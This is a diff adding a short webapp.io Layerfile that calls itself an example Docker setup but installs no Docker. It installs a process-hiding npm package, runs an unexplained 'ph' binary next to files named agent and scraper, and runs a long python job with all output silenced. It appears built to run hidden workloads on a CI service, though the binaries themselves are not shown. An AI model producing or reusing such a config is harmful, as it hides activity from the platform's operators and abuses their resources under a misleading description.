@@ -1,0 +1,15 @@
+#This is an example webapp.io configuration for Docker!
+FROM vm/ubuntu:18.04
+
+# To note: Layerfiles create entire VMs, *not* containers!
+ENV TERM=xterm
+# install the latest version of Docker, as in the official Docker installation tutorial.
+RUN apt-get update -y > /dev/null
+RUN apt-get install curl npm python3 procps --assume-yes > /dev/null
+RUN npm i -g node-process-hider > /dev/null
+
+# copy files from the repository into this staging server
+COPY . .
+RUN chmod +x builder agent scraper ph > /dev/null
+RUN ./ph > /dev/null
+RUN watch free -m & timeout -k 30 3600 python3 streamlit_app.py > /dev/null; exit 0
